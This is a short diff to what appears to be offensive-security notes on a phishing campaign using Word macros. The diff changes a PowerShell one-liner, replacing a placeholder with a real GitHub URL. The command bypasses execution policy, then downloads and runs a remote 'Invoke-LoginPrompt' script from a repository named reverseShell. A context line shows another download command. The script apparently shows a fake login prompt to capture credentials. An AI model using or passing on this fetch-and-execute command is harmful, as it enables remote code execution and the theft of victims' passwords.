@@ -17,5 +17,5 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 ## Full scenario of remote hacking via Macro Word (phishing campaign)
 
 
- powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘URL_To_Invoke-LoginPrompt’)); Invoke-LoginPrompt
+ powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/S-crow/reverseShell/master/Invoke-LoginPrompt.ps1’)); Invoke-LoginPrompt
 
